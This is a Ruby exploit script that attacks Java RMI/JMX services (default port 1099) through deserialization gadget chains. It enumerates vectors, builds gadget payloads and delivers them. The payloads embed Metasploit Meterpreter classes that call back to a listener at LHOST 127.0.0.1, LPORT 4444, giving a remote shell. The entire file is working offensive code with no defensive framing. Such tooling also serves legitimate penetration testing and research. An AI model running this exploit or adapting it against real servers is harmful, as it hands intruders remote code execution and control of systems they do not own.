#!/usr/bin/env ruby
require_relative 'classfile'
require_relative 'runner'
require_relative 'gadgets'
require_relative 'meterpreter'

host = '127.0.0.1'

host = ARGV[0] unless ARGV.empty?

port = 1099

port = ARGV[1].to_i if ARGV.length > 1

ssl = FALSE
jmxcreds = nil
# jmxcreds = Java::Serialize::JavaArray.new("Ljava/lang/String;", ["test","test"])

params = {
  'classfiles' => Java::Meterpreter.meterpreter_classes({
                                                          'LPORT' => 4444,
                                                          'LHOST' => '127.0.0.1'
                                                        }, ['metasploit/TransletPayload.class'])
}

runner = Java::Runner::RMICheck.new(host, port, ssl: ssl, username: 'test', password: 'test')
vectors = runner.run

gadgets = Java::Gadgets::BuiltinGadgets.new

vectors.each do |vector|
  next unless vector.respond_to?('context')

  ctx = vector.context
  matches = gadgets.find(ctx, params: params)

  matches.each do |match|
    payl = match.create(ctx, params: params)
    begin
      vector.deliver(payl)
    rescue Java::JRMP::JRMPError => e
      root = Java::JRMP.unwrap_exception(e.ex)
      info 'Call returned error, this does not necessarily mean that the exploit failed: ' + root[0][0] + ':' + root[1]['detailMessage']
    end
  end
end
